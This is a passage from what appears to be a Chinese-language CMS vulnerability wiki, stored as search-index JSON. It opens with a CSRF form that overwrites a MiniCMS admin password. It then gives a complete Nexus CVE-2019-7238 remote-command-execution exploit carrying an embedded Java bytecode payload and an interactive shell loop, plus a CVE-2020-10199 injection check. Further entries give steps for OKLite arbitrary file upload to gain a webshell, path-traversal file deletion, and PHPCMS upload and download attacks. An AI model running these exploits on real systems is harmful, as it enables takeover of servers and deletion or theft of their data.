<pre><code>&lt;html&gt;\n &lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\"&gt;\n &lt;title&gt;test&lt;/title&gt;\n &lt;body&gt;\n &lt;form action=\"http://127.0.0.1/minicms/mc-admin/conf.php\" method=\"post\"&gt;\n &lt;input type=\"hidden\" name=\"site_name\" value=\"hack123\" /&gt;  \n &lt;input type=\"hidden\" name=\"site_desc\" value=\"hacktest\" /&gt;  \n &lt;input type=\"hidden\" name=\"site_link\" value=\"http://127.0.0.1/minicms\" /&gt;  \n &lt;input type=\"hidden\" name=\"user_nick\" value=\"hack\" /&gt;  \n &lt;input type=\"hidden\" name=\"user_name\" value=\"admin\" /&gt;  \n &lt;input type=\"hidden\" name=\"user_pass\" value=\"hackpass\" /&gt;  \n &lt;input type=\"hidden\" name=\"comment_code\" value=\"\" /&gt;  \n &lt;input type=\"hidden\" name=\"save\" value=\" \" /&gt; \n &lt;/form&gt;\n &lt;script&gt;\n  document.forms[0].submit();\n &lt;/script&gt;\n &lt;/body&gt;\n &lt;/head&gt;\n &lt;/html&gt;\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2019-7238_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"Cve 2019 7238 \u547d\u4ee4\u6267\u884c","text":"<pre><code>#!/usr/bin/python3\n#-*- coding:utf-8 -*-\n# author:zhzyker\n# from:https://github.com/zhzyker/exphub\n# telegram:t.me/zhzyker\n\nimport requests\nimport sys\n\nif len(sys.argv)!=2:\n    print('+-------------------------------------------------------------+')\n    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub        +')\n    print('+      Nexus Repository Manager 3 remote command execution  \u00a0 +')\n    print('+-------------------------------------------------------------+')\n    print('+ USE: python3 &lt;filename&gt; &lt;url&gt;                               +')\n    print('+ EXP: python3 struts2-032_cmd.py http://freeerror.org:8081   +')\n    print('+ VER: Nexus Repository Manager OSS/Pro 3.6.2 -3.14.0         +')\n    print('+-------------------------------------------------------------+')\n    sys.exit()\nurl = sys.argv[1]\ncmd = \"whoami\"\nvuln = url + \"/service/extdirect\"  \n\nheaders = {\n'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0\",\n'Accept': \"*/*\",\n'Content-Type': \"application/json\",\n'X-Requested-With': \"XMLHttpRequest\",\n'Connection': \"close\",\n'Cache-Control': \"no-cache\"\n}\ndef exp(cmd):\n    payload = \"{\\\"action\\\": \\\"coreui_Component\\\", \\\"type\\\": \\\"rpc\\\", \\\"tid\\\": 8, \\\"data\\\": [{\\\"sort\\\": [{\\\"direction\\\": \\\"ASC\\\", \\\"property\\\": \\\"name\\\"}], \\\"start\\\": 0, \\\"filter\\\": [{\\\"property\\\": \\\"repositoryName\\\", \\\"value\\\": \\\"*\\\"}, {\\\"property\\\": \\\"expression\\\", \\\"value\\\": \\\"function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){   z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];   y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\\\ndefineClass.setAccessible(true);\\\\nx=defineClass.invoke(\\\\ny,\\\\n   'Exploit.Test234',\\\\nz.getBytes('latin1'),0,\\\\n3054\\\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'}\\\\n\\\"}, {\\\"property\\\": \\\"type\\\", \\\"value\\\": \\\"jexl\\\"}], \\\"limit\\\": 50, \\\"page\\\": 1}], \\\"method\\\": \\\"previewAssets\\\"}\" % cmd\n    r =requests.post(vuln, data=payload,headers=headers, verify=False)\n    if r.status_code ==200:\n        print (r.text)\n    else: \n        print (\"[-] Target \"+url+\" Not CVE-2019-7238\")\n        exit()\n\nwhile 1:\n    cmd = input(\"Shell &gt;&gt;&gt; \")\n    if cmd == \"exit\" : exit(0)\n    exp(cmd)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2020-10199/","title":"Cve 2020 10199","text":"<pre><code>#!/usr/bin/python3\n# -*- coding:utf-8 -*-\n# author:zhzyker\n# from:https://github.com/zhzyker/exphub\n\nimport sys\nimport requests\nimport json\n\nif len(sys.argv)!=5:\n    print('+----------------------------------------------------------------------------------------------------------+')\n    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                                                     +')\n    print('+      CVE-2020-10199 need username &amp; password                                                             +')\n    print('+----------------------------------------------------------------------------------------------------------+')\n    print('+ USE: python3 &lt;filename&gt; &lt;ip&gt; &lt;port&gt; &lt;csrf&gt; &lt;sessionid&gt;                                                   +')\n    print('+ EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb  +')\n    print('+ VER: Nexus Repository Manager OSS/Pro version &lt;= 3.21.1                                                  +')\n    print('+----------------------------------------------------------------------------------------------------------+')\n    sys.exit()\nip = sys.argv[1]\nport = sys.argv[2]\ncsrf = sys.argv[3]\nsessionid = sys.argv[4]\n\nurl = \"http://\"+ip+\":\"+port\n\nheaders = {\n    \"Host\": \"%s:%s\" % (ip, port),\n    \"Referer\": url,\n    \"X-Nexus-UI\": \"true\",\n    \"X-Requested-With\": \"XMLHttpRequest\",\n    \"NX-ANTI-CSRF-TOKEN\": csrf,\n    \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0\",\n    \"Accept\": \"application/json, text/plain, */*\",\n    \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\n    \"Accept-Encoding\": \"gzip, deflate\",\n    \"Content-Type\": \"application/json\",\n    \"Cookie\": \"NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s\" % (csrf, sessionid),\n    \"Origin\": url,\n    \"Connection\": \"close\"\n    }\n\nvulurl=url+\"/service/rest/beta/repositories/go/group\"\n\npayload = {\"name\": \"internal\", \"online\": \"true\", \"storage\": {\"blobStoreName\": \"default\", \"strictContentTypeValidation\": \"true\"}, \"group\": {\"memberNames\": [\"$\\\\A{233*233}\"]}}\n\nr = requests.post(vulurl, data=json.dumps(payload), headers=headers)\nprint (r.text)\nif \"A54289\" in r.text:\n    print (\"[+] CVE-2020-10199 vulnerability exists. exp as https://github.com/zhzyker/exphub\")\nelse:\n    print (\"[-] CVE-2020-10199 vulnerability does not exist.\")\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 16131 OKLite v1.2.25 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Ethan\u53d1\u73b0OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u76f4\u63a5\u4e0a\u4f20getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ea7\u54c1","text":"<p>OKLite</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_6","title":"\u7248\u672c","text":"<p>OKLite v1.2.25 \u7248\u672c  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_7","title":"\u7ec4\u4ef6","text":"<p>OKLite  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u767b\u5f55\u540e\u53f0\uff0c\u70b9\u51fb\u6a21\u5757\u7ba1\u7406  </p> <p>\u7f16\u8f91\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6test.php,\u538b\u7f29\u4e3atest.zip\u4e0a\u4f20\u3002 </p> <p>\u7136\u540e\u5bfc\u5165\u6a21\u5757</p> <p>\u70b9\u51fb\u5f00\u59cb\u4e0a\u4f20\uff0c\u4e0a\u4f20shell\u751f\u6210\u5728\u89e3\u538b\u4e3b\u76ee\u5f55\u4e0b\u9762</p> <p>\u8bbf\u95ee<code>http://127.0.0.1:8888/1.2.25/data/cache/test.php</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 16132 OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Ethan\u53d1\u73b0OKLite v1.2.25 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff08\u9700\u8981\u767b\u5f55\u540e\u53f0\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u540e\u53f0\u5220\u9664\u6587\u4ef6\u65f6\u6293\u5305\u4fee\u6539<code>title</code>\u53c2\u6570\u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u7f51\u7ad9\u4efb\u610f\u6587\u4ef6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ea7\u54c1","text":"<p>OKLite</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_6","title":"\u7248\u672c","text":"<p>OKLite v1.2.25 \u7248\u672c  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_7","title":"\u7ec4\u4ef6","text":"<p>OKLite  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u5728\u4e3b\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2aindex.txt\u7528\u6765\u6d4b\u8bd5</p> <p>\u767b\u5f55\u540e\u53f0\uff0c\u5728\u8bbe\u7f6e-&gt;\u98ce\u683c\u7ba1\u7406</p> <p>\u70b9\u51fb\u6587\u4ef6\u7ba1\u7406</p> <p>\u968f\u4fbf\u5220\u9664\u4e00\u4e2a\u6587\u4ef6\uff0c\u70b9\u51fb\u6293\u5305\uff0c\u4fee\u6539title\u53c2\u6570\u4e3a../../test.txt</p> <p>\u53d1\u9001\u8bf7\u6c42\uff0c\u4e3b\u76ee\u5f55\u4e0b\u7684test.txt\u5df2\u88ab\u5220\u9664</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/","title":"PHPCMS_v9.6.0_SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#official","title":"Official","text":"<p>http://bbs.phpcms.cn/thread-936226-1-1.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#affected-version","title":"Affected Version","text":"<p>PHPCMS v9.6.0</p> <p>github\u83b7\u53d6\u811a\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#poc","title":"PoC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/#references","title":"References","text":"<ol> <li>https://zhuanlan.zhihu.com/p/26263513</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"PHPCMS_v9.6.0_\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#official","title":"Official","text":"<p>http://bbs.phpcms.cn/thread-936226-1-1.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#affected-version","title":"Affected Version","text":"<p>PHPCMS v9.6.0</p> <p>github\u83b7\u53d6\u811a\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#poc","title":"PoC","text":"<p>\u6ce8\u610f\uff1a \u6bcf\u6b21\u6d4b\u8bd5\u540e\u90fd\u9700\u8981\u628a poc.py \u4e2d post data \u7684 username \u548c email \u4fee\u6539\u4e00\u904d\u3002</p> <p></p> <p>\u4f7f\u7528\u83dc\u5200\u8fde\u63a5\uff1a</p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#references","title":"References","text":"<ol> <li>http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u5206\u6790/</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","title":"PHPCMS_v9.6.1_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#affected-version","title":"Affected Version","text":"<p>PHPCMS v9.6.1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#poc","title":"PoC","text":"<p>\u6ce8\u610f\uff1a \u82e5\u672c\u5730\u6d4b\u8bd5 PoC \u6267\u884c\u5931\u8d25\u53ef\u4ee5\u901a\u8fc7\u8be5\u6307\u5b9a hosts\u6587\u4ef6 localhost \u4e3a 127.0.0.1 \u89e3\u51b3\u3002</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#references","title":"References","text":"<ol> <li>http://bobao.360.cn/learning/detail/3805.html?m=wap&amp;c=index&amp;a=init&amp;siteid=1</li> <li>https://www.seebug.org/vuldb/ssvid-92959</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","title":"PHPCMS_v9.6.2_\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#affected-version","title":"Affected Version","text":"<ul> <li>PHPCMS v9.6.1</li> <li>PHPCMS v9.6.2</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#poc","title":"PoC","text":"<p>\u590d\u73b0\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u4e24\u70b9\uff1a</p> <ol> <li> <p>\u65b0\u5b89\u88c5\u7684 PHPCMS_v9.6.2 \u76ee\u5f55 \\PHPCMS_v9.6.2\\caches\\caches_commons\\caches_data \u7f3a\u5c11\u7f13\u5b58\u6a21\u578b\u6587\u4ef6 model.cache.php \u53ef\u4ee5\u901a\u8fc7\u590d\u5236 PHPCMS_v9.6.1 \u54cd\u5e94\u76ee\u5f55\u7684\u6587\u4ef6\u5f97\u5230\u3002</p> </li> <li> <p>\u901a\u8fc7 xxx.php/ \u7684\u65b9\u5f0f\u7ed5\u8fc7\u6587\u4ef6\u540e\u7f00\u540d\u68c0\u6d4b\u9700\u8981\u5728 PHP \u7248\u672c\u4e3a 5.2.x \u65f6 \u624d\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\u3002</p> </li> </ol> 